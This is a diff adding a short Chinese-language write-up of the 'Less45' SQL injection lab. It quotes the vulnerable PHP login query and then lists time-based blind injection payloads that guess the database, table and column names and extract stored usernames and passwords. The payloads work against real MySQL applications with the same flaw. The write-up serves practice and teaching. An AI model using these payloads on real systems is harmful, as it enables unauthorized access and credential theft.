@@ -1,0 +1,32 @@
+<hr>
+<h2 id="title-less45url-https-www-yuque-com-u29002979-ep2zrx-migwvg8gv43b2gna"><a href="#title-less45url-https-www-yuque-com-u29002979-ep2zrx-migwvg8gv43b2gna" class="headerlink" title="title: less45url: https://www.yuque.com/u29002979/ep2zrx/migwvg8gv43b2gna"></a>title: less45<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/migwvg8gv43b2gna">https://www.yuque.com/u29002979/ep2zrx/migwvg8gv43b2gna</a></h2><pre><code class="bash">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);
+$password = $_POST[&quot;login_password&quot;];
+
+$sql = &quot;SELECT * FROM users WHERE username=(&#39;$username&#39;) and password=(&#39;$password&#39;)&quot;;
+if (@mysqli_multi_query($con1, $sql))
+</code></pre>
+<p>测试发现与Less44的区别为闭合方式为**’)  ** <a name="Ehstz"></a></p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre><code class="bash">拆解数据库名称长度
+-1&#39;) or if(length(database())=8,sleep(5),0)#
+
+猜解数据库名称 
+-1&#39;) or if(ascii(mid(database(),1,1))&lt;=135,sleep(5),0)--+
+
+猜解数据表名称长度
+-1&#39;) or if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(5),0)#
+
+猜解数据表名称
+-1&#39;) or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)=&#39;e&#39;,sleep(5),0)--+
+
+
+猜解字段名称长度
+-1&#39;) or if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))=20,sleep(5),0)#
+
+猜解字段名称
+-1&#39;) or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1)=&#39;i&#39;,sleep(5),0)--+
+
+猜解字段内容
+-1&#39;) or if(mid((select group_concat(username,0x7e,password) from users),1,1)=&#39;D&#39;,sleep(5),0)--+
+</code></pre>
+<p><a name="jCJOl"></a></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
